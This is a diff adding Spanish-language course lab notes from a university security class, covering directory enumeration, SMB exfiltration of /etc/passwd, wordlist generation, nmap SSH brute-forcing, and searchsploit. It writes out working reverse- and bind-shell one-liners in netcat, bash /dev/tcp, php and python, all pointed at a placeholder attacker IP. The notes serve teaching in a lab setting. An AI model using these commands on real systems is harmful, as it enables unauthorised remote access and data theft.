@@ -1,3 +1,5 @@
+*Todo este fichero ha sido elaborado gracias a los materiales impartidos en la asignatura de Seguridad de Sistemas Informáticos de La Universidad de Oviedo. Es una guía completa sobre cómo realizar los laboratorios con pequeñas notas extra realizadas por mi*
+
 # 3 Febrero 2023 - Lab1 ⚱️
 
 - Crear un usuario en Linux: `sudo adduser <user>`
@@ -810,5 +812,125 @@ Para comprobar si ModSecurity en el proxy está dando protección a los servidor
 ## SCA y SAST
 
 - Mirar en el guión 10
+
+---
+# Lab11 ⚱️
+
+## Enumerar posibles archivos ocultos con información interesante (Exploit Public-Facing Application)
+
+- Usaremos el **tool dirb**
+- Cheatsheet de **dirb**
+![[Pasted image 20230531221044.png]]
+- Un escaneo simple con **dirb**: `dirb <url>`
+
+## Exfiltración a través de directorios compartidos por SMB (Exploit Public-Facing Application)
+
+- Para saber si un servidor expone ficheros interesantes a través de su funcionalidad de ficheros compartidos
+
+- SMB es un protocolo para compartir carpetas, archivos e impresoras que funciona en varios SOs. Si se configura incorrectamente, se puede utilizar para obtener datos confidenciales de un sistema remoto simplemente haciendo una conexión para explorar los archivos expuestos de forma remota a través del protocolo SMB. Esta actividad consiste en usar los **tools SMBMap** o **smbclient** para obtener el archivo `/etc/passwd` de un sistema remoto.
+- **SMBMap**: https://github.com/ShawnDEvans/smbmap, tutorial-> https://www.nopsec.com/smbmap-wield-it-like-the-creator/
+- **smbclient**: https://www.cybrary.it/0p3n/easily-exploit-poorly-configured-smb
+
+### smbclient
+
+- Listar las carpetas compartidas para un sistema remoto: `smbclient -L fileserver`
+![[Pasted image 20230531222501.png]]
+
+### SMBMap
+
+- Escaneo por defecto: `smbmap -H <ip_objetivo>`
+![[Pasted image 20230531223345.png]]
+- Enumerar un directorio particular: `smbmap -H <ip_objetivo> -r <directory>` 
+![[Pasted image 20230531223329.png]]
+- Una vez encontramos el fichero `/etc/passwd` lo descargamos: `smbmap -H <ip_objetivo> --download <archivo>`
+![[Pasted image 20230531224001.png]]
+
+## Diccionarios de contraseñas de palabras comunes contra objetivos concretos (Valid Accounts)
+
+- Para saber si los usuarios que hay en un fichero de passwords usan contraseñas que son palabras que se encuentran en una web, y por tanto son fáciles de romper
+
+- Vamos a generar una lista de palabras personalizada a partir del contenido de la página web de una víctima
+- Cheatsheet para generar lista de palabras con el **tool cewl**:
+![[Pasted image 20230531224324.png]]
+- Tutorial sobre cómo usar cewl: https://esgeeks.com/como-utilizar-cewl/
+
+- Ejemplo con caracteres mínimos y salida a fichero: `cewl -c -m 5 <ip_objetivo> -w <fichero>`
+
+## Fuerza bruta con Nmap (Valid Accounts)
+
+- Para saber si los usuarios de un servicio remoto  usan una clave de una lista de palabras que tienes, y por tanto, algunas cuentas de usuario son fáciles de romper
+
+- Pasos:
+	- Primero hacemos un escaneo rápido con Nmap: `sudo nmap -sV -sS <ip_objetivo>` ![[Pasted image 20230531224951.png]]
+	- Localiza los scripts NSE adecuados que usen técnicas de fuerza bruta en `/usr/share/nmap/scripts`
+	 ![[Pasted image 20230531225133.png]]
+	 - Usa el hecho de que sabemos que un usuario válido en el sistema es `remotessiuser`
+	 - SOLUCIÓN:
+		 - Usaremos el script `ssh-brute`
+		 - Usaremos el siguiente comando: `nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst <target>`![[Pasted image 20230531230035.png]]![[Pasted image 20230531230046.png]]
+		 - Obtenemos la password `ingenieriainformatica`
+		 - Nos podemos conectar por ssh ![[Pasted image 20230531230351.png]] ![[Pasted image 20230531230407.png]]
+
+## Netcat como herramienta de escucha (Command & Scripting Interpreter)
+
+- Para entender como funciona el **tool Netcat**
+
+- Cheatsheet del **tool Netcat**:
+![[Pasted image 20230531232009.png]]
+
+- Para poner Netcat en modo escucha: `nc -lvp <port>`
+- Para enviar una peticion a cualquier puerto: `telnet <ip> <port>`
+![[Pasted image 20230531231745.png]]
+
+## Bind shell con Netcat (Command & Scripting Interpreter)
+
+- Para crear un bind shell en un sistema remoto y ejecutar comandos en él
+
+- Para obtener un bind shell en la máquina remota:
+	- Primero habilitaremos un listener en la máquina atacante: `nc -lvp <port>`
+	- Luego escribiremos el siguiente comando en la máquina objetivo: `nc <ip_attacker> <port> -e /bin/bash` ![[Pasted image 20230531232648.png]]
+	- Si ejecutamos: `python3 -c "import pty;pty.spawn('/bin/bash')"`, **obtenemos una shell completamente funcional**
+
+## Reverse shell con Netcat (Command & Scripting Interpreter)
+
+- Para crear una reverse shell en un sistema remoto y ejecutar comandos en él
+
+- Para crear una reverse shell:
+	- Primero habilitaremos un listener en la máquina atacante: `nc -lvp <port>`
+	- Luego escribiremos el siguiente comando en la máquina objetivo: `bash -i >& /dev/tcp/<ip_attacker>/<port> 0>&1` ![[Pasted image 20230531233246.png]]
+
+## Reverse shell sin Netcat (Command & Scripting Interpreter)
+
+- Puedes crear un reverse shell en un sistema remoto y ejecutar comandos en el mismo netcat aunque netcat no esté disponible en el sistema remoto
+
+- Para crear un reverse shell con **php**:
+	- Primero habilitaremos un listener en la máquina atacante: `nc -lvp <port>`
+	- Luego escribiremos el siguiente comando en la máquina objetivo: `php -r '$sock=fsockopen("<ip_attacker>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'` ![[Pasted image 20230531234255.png]]
+- Para crear un reverse shell con python:
+	- Primero habilitaremos un listener en la máquina atacante: `nc -lvp <port>`
+	- Luego escribiremos el siguiente comando en la máquina objetivo: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip_attacker>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+
+
+## Searchploit (Exploitation for Client Execution)
+
+- Para localizar exploits disponibles de una vulnerabilidad conocida gracias al **tool searchsploit**
+- Tutorial: https://www.exploit-db.com/searchsploit
+
+- Cheatsheet de Searchsploit:
+![[Pasted image 20230531234850.png]]
+
+- Para buscar los exploits de una máquina de una forma automatizada:
+	- Hacer un escaneo nmap completo de lo que queramos y guardarlo en un xml: `sudo nmap -sV -sS <ip_objetivo> -oX <fichero.xml>`
+	- Introducimos el siguiente comando en searchsploit: `searchsploit --nmap <fichero_nmap.xml>` ![[Pasted image 20230531235248.png]]
+	- También podemos buscar el exploit equivalente en la web: https://www.exploit-db.com/
+
+
+## GTFOBins para exfiltración de datos
+
+- Para extraer información de un sistema remoto usando la técnica de los GTFOBin
+
+- Esta técnica utiliza **binarios legítimos de sistema operativo** para hacer cosas diferentes a las que se supone que deben hacer.
+
+- Ver tema 7 de teoría y usar esos comandos.
 
 ---
